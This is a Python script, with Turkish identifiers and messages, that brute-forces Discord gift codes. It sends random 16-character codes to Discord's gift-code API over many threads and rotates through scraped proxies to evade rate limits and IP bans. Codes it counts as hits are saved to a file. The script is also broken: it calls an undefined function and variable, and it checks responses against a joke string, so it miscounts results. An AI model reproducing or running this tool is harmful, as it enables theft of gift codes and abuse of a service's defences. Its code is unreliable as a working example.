from __future__ import print_function
import time
from pathlib import Path
import urllib3
import urllib.request
import requests
from itertools import groupby
import threading
import operator
import string
import proxyscrape
import random
import numpy as np
from random import randint

alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"


def ProxyRead():
	purl = "proxy okunması için url gir"
	pr = requests.get(purl)
	ProxyArray = pr.text.split("\r\n")
	return ProxyArray
	
def FormatProxy(proxyInput):
	proxyOutput = {'https':proxyInput}
	return proxyOutput
	
print(ProxyRead())



def randomCode(size=16, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for i in range(size))
		
def ProxiesRandom():
	proxies = ProxyRead()[randint(0, len(ProxyRead())-1)]
	return proxies


running = "false"

def Check():
	while("true"):
		canimizkodumuz = rastgelekodumuz()
		url = ("https://discordapp.com/api/v6/entitlements/gift-codes/"+ canimizkodumuz +"?with_application=false&with_subscription_plan=true" )
		r = requests.get(url, proxies=FormatProxy(ProxiesRandom()))
		if(r.text == '{"code": 10038, "message": "moruk bak o öyle degil ben sana anlatiyim"}'):
			print(str(canimizkodumuz) + " calismadi rip\n")
			time.sleep(1)
		elif 'rate' in r.text:
			l = [int(''.join(i)) for is_digit, i in groupby(r.text, str.isdigit) if is_digit]
			makeitastring = ''.join(map(str, l))
			saniye = float(makeitastring) / 1000
			print ("ip ban yedik lol " + str(saniye) + "saniye sonra gorusuruz\n")
			time.sleep(saniye + 3)
		else:
			print ("basarili \n \n \n \n %s - hll - \n \n \n \n" % canimizkodumuz)
			out = open("basardim.txt", "a")
			out.write(str(canimizkodumuz))
			out.write("\n")
			currentCode += 1
			print(str(canimizkodumuz))
			
kappa = 0
print(FormatProxy(ProxiesRandom()))


print("islem? KEKW")
th = int(input())



while(th != 0):
	threading.Thread(target=Check).start()
	th -= 1
